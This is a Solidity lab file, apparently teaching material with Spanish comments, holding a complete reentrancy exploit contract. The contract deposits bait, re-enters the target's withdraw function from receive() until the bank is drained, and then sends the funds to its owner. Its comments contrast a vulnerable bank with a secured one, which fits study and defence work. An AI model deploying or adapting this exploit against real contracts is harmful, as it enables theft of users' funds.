// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBanco {
    function depositar() external payable;
    function retirar() external;
}

/**
 * @title Atacante · Laboratorio 09 · el exploit de reentrancy
 * @notice Deposita una vez y, cada vez que el banco le envía su retiro,
 *         vuelve a llamar a retirar() ANTES de que el banco ponga su saldo
 *         en cero. Repite hasta vaciar el banco.
 *
 * Contra BancoVulnerable: lo vacía.
 * Contra BancoSeguro: la primera reentrada revierte y el ataque falla.
 */
contract Atacante {
    IBanco public immutable banco;
    address public immutable dueno;
    uint256 public cebo;

    constructor(address banco_) {
        banco = IBanco(banco_);
        dueno = msg.sender;
    }

    /// Deposita el cebo y dispara el primer retiro.
    function atacar() external payable {
        cebo = msg.value;
        banco.depositar{value: msg.value}();
        banco.retirar();
    }

    /// El banco envía ETH → esto se ejecuta → se vuelve a entrar.
    receive() external payable {
        if (address(banco).balance >= cebo) {
            banco.retirar();       // reentrada: el banco aún cree que tenemos saldo
        }
    }

    function recoger() external {
        require(msg.sender == dueno, "solo el dueno");
        (bool ok, ) = payable(dueno).call{value: address(this).balance}("");
        require(ok, "fallo");
    }
}
